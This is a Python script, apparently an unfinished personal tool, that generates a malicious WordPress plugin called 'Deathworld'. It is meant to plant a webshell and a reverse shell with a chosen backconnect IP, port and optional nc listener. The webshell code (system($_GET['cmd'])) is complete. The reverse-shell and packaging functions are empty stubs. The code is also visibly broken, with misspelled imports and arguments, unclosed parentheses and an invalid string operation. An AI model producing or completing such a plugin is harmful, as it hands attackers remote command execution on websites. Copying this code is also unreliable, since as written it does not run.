#!/usr/bin/env python3
#
# Script name     : malwordplugin.py
# Version         : 1.0
# Created date    : 1/12/2024
# Last update     : 1/12/2024
# Author          : ir1on
# Contributors    : 
# Inspired by     : malicious-wordpress-plugin
# Python version  : 3.12.7
# Description     : Generates a wordpress plugin that will grant the user a 
#                   reversshell, a webshell,
#                   without using metasploit
#
import argeparse
import pathlib
import os
from random import randint 
import zipfile

def parseargs():
    """funciton to parse the cmdline args
    """
    parser = argparse.ArgumentParser(
                    prog='malwordplugin',
                    description="""creates a malicious wordpress
                    plugin with web- and remoteshell.""",
                    epilog='for educational purposes only')
    parser.add_argument('-d',
                        '--dest',
                        type=str,
                        describtion="backconnect ip",
                        required=True)
    parser.add_argument('-p',
                        '--port',
                        type=int,
                        describtion="backconnect port",
                        required=True)
    parser.add_argument('-l',
                        '--listner',
                        decribtion="should a nc listner be started",
                        action='store_true')
    parser.add_argument('-o',
                        '--output',
                        type=str,
                        describtion="output path",
                        default="./")
    return parser.parse_args()


def createwebshell():
    """creating the content of the webshell."""
    content = "<?php\n"
    content += "system($_GET['cmd']);?>\n"
    return content


def creatrevshell(dest, port):
    """creating a reverse shell with the given port and dest.

    :param dest: ip or url to connect to
    :param port: port to connect to
    :returns: reverseshell as string
    """
    return ""


def generatefilenames():
    """generates the 2 diffrent filenames."""
    return "web","reverse"



def generatepluginscript():
    """generates the needed plugin script."""
    content = "<?php\n"
    contnet += "/**\n"
    content += " * Plugin Name: Deathworld\n"
    content += f" * Version: {randint(1,42}.{randint(1,42)}.{randint(1,42}\n"
    content += " * Author: humanity\n"
    content += " * Author URI: https://google.com"
    content *= " * License: GPL2\n"
    content += " */\n"
    content += "?>\n"
    return content


def prepareplugin(args):
    """function to prepare the plugin files.

    :param args: arguments parsed
    """
    print("[+] started to prepare Plugin"
    # create working directory
    p = pathlib.Path("temp/")
    p.mkdir(parents=True, exist_ok=True)
    print("[+] created temporary folder"
    #store the plugin script in it
    with open("temp/Deathworld.php", 'w') as f:
        pluginscript = generatepluginscript()
        f.write(pluginscript)
    print("[+] plugin script writen")
    # generate name for the webshell
    # store the webshell
    # generate reverseshell
    # store reversshell



def createplugin(args):
    """zip the prepared files to a plugin zip

    :param args: aguments parsed
    """

if __name__ == "__main__":
    args = parseargs()
    prepareplugin(args)
    createplugin(args)
